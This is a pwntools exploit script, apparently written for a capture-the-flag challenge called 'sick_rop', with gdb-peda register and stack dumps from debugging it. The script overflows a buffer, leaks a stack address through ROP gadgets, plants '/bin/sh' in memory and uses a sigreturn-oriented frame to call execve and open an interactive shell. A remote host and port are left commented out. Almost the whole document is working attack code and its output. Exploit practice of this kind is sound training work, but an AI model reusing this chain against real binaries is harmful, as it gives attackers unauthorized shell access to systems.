from pwn import *
context.clear(
    arch="amd64"
)
exe = context.binary = ELF('sick_rop')
syscall = p64(0x0000000000401014)
#p = remote("165.232.101.11",31148)
p = process('./sick_rop')
pad = b'A' * 40  
#gdb=  gdb.attach(p,gdbscript='b * read')

write = p64(0x401017)
read = p64(0x401040)
syscall = p64(0x0000000000401014)
ret = p64(0x0000000000401016)
push_r10 = p64(0x0000000000401046)
life_hack = p64(0x000000000040100f)
vuln = p64(0x040102f)
ret_from_vuln = p64(0x000000000040104e)

#frame1 = bytes(frame)

payload1 = pad
payload1 += vuln
payload1 += b'AAAAAAAA'
payload1 += life_hack
payload1 += vuln
payload1 += b'AAAAAAAA'
payload1 += p64(0x200)

p.send(payload1)
p.recv(len(payload1))
p.send(b'B')
trash = p.recv(0x1)
leak = p.recv(0x200)
leak1=  u64(leak[72:80]) #-7371
print(hex(leak1))

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = leak1
frame.rdx = 0x0
frame.rsi = 0x0
frame.rip = 0x0000000000401014   
sframe = bytes(frame)

payload2 = pad
payload2 += p64(0x0000000000401000)
payload2 += vuln
payload2 += p64(leak1)
payload2 += p64(0x8)


p.send(payload2)
p.recv(len(payload2))
p.send(b'/bin/sh\0')

payload3 = pad
payload3 += vuln
payload3 += b'AAAAAAAA'
payload3 += syscall
payload3 += sframe

p.send(payload3)
p.recv(len(payload3))
p.send(0xf*b"A")



#trash = p.recv(len(payload1))
#leak = u64(p.recv(8))
#print(hex(leak))

#stack = p.recv(0x38)
#stack2 = p.recv(0x38)
#leak = u64(stack2[0x20:0x28])

#print(hex(leak))

#out = p.recv(10000)
#out2 = p.recvline()
#trash = len(out)
#trash2 = out.split('|')[1]
#count = 8

#while count < len(out):
#    print hex(u64(trash2[count-8:count]))
#    count  = count +8
#interesting = len(out)
#print 'line: ',hex(trash), interesting,hex(trash2)
#a = p.recv(6).ljust(8,'\0')


#print 'addr: ' +a

p.interactive()
"""
gdb-peda$ info registers 
rax            0x38	0x38
rbx            0x0	0x0
rcx            0x40102d	0x40102d
rdx            0x38	0x38
rsi            0x7ffd8e7f0090	0x7ffd8e7f0090
rdi            0x1	0x1
rbp            0x7ffd8e7f00b0	0x7ffd8e7f00b0
rsp            0x7ffd8e7f0070	0x7ffd8e7f0070
r8             0x0	0x0
r9             0x0	0x0
r10            0x7ffd8e7f0090	0x7ffd8e7f0090
r11            0x306	0x306
r12            0x0	0x0
r13            0x0	0x0
r14            0x0	0x0
r15            0x0	0x0
rip            0x40104d	0x40104d <vuln+31>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb-peda$ x/30gx $rsp 
0x7ffd8e7f0070:	0x00007ffd8e7f0090	0x0000000000000038
0x7ffd8e7f0080:	0x00007ffd8e7f0090	0x0000000000000300
0x7ffd8e7f0090:	0x4141414141414141	0x4141414141414141
0x7ffd8e7f00a0:	0x4141414141414141	0x4141414141414141
0x7ffd8e7f00b0:	0x7c41414141414141	0x0000000000401016
0x7ffd8e7f00c0:	0x0000000000401040	0x00007ffd8e7f10d6
0x7ffd8e7f00d0:	0x0000000000000000	0x00007ffd8e7f10e1
0x7ffd8e7f00e0:	0x00007ffd8e7f10f7	0x00007ffd8e7f16e3
0x7ffd8e7f00f0:	0x00007ffd8e7f16fe	0x00007ffd8e7f1720
0x7ffd8e7f0100:	0x00007ffd8e7f1735	0x00007ffd8e7f174d
0x7ffd8e7f0110:	0x00007ffd8e7f178b	0x00007ffd8e7f17a2
0x7ffd8e7f0120:	0x00007ffd8e7f17b3	0x00007ffd8e7f17be
0x7ffd8e7f0130:	0x00007ffd8e7f17ee	0x00007ffd8e7f180e
0x7ffd8e7f0140:	0x00007ffd8e7f182e	0x00007ffd8e7f1842
0x7ffd8e7f0150:	0x00007ffd8e7f1888	0x00007ffd8e7f189b

gdb-peda$ info registers 
rax            0x0	0x0
rbx            0x0	0x0
rcx            0x40102d	0x40102d
rdx            0x0	0x0
rsi            0x7ffd8e7f0090	0x7ffd8e7f0090
rdi            0x1	0x1
rbp            0x7c41414141414141	0x7c41414141414141 # zato najverjetneje crash, ker rbp mora bit valid stack addr
rsp            0x7ffd8e7f00b8	0x7ffd8e7f00b8
r8             0x0	0x0
r9             0x0	0x0
r10            0x7ffd8e7f0090	0x7ffd8e7f0090
r11            0x206	0x206
r12            0x0	0x0
r13            0x0	0x0
r14            0x0	0x0
r15            0x0	0x0
rip            0x40104d	0x40104d <vuln+31>
eflags         0x206	[ PF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb-peda$ x/30gx $rsp 
0x7ffd8e7f00b8:	0x00007ffd8e7f0090	0x0000000000000000
0x7ffd8e7f00c8:	0x00007ffd8e7f10d6	0x0000000000000000
0x7ffd8e7f00d8:	0x00007ffd8e7f10e1	0x00007ffd8e7f10f7
0x7ffd8e7f00e8:	0x00007ffd8e7f16e3	0x00007ffd8e7f16fe
0x7ffd8e7f00f8:	0x00007ffd8e7f1720	0x00007ffd8e7f1735
0x7ffd8e7f0108:	0x00007ffd8e7f174d	0x00007ffd8e7f178b
0x7ffd8e7f0118:	0x00007ffd8e7f17a2	0x00007ffd8e7f17b3
0x7ffd8e7f0128:	0x00007ffd8e7f17be	0x00007ffd8e7f17ee
0x7ffd8e7f0138:	0x00007ffd8e7f180e	0x00007ffd8e7f182e
0x7ffd8e7f0148:	0x00007ffd8e7f1842	0x00007ffd8e7f1888
0x7ffd8e7f0158:	0x00007ffd8e7f189b	0x00007ffd8e7f18a6
0x7ffd8e7f0168:	0x00007ffd8e7f18c9	0x00007ffd8e7f18f2
0x7ffd8e7f0178:	0x00007ffd8e7f1928	0x00007ffd8e7f1936
0x7ffd8e7f0188:	0x00007ffd8e7f194a	0x00007ffd8e7f195b
0x7ffd8e7f0198:	0x00007ffd8e7f196a	0x00007ffd8e7f1981
"""
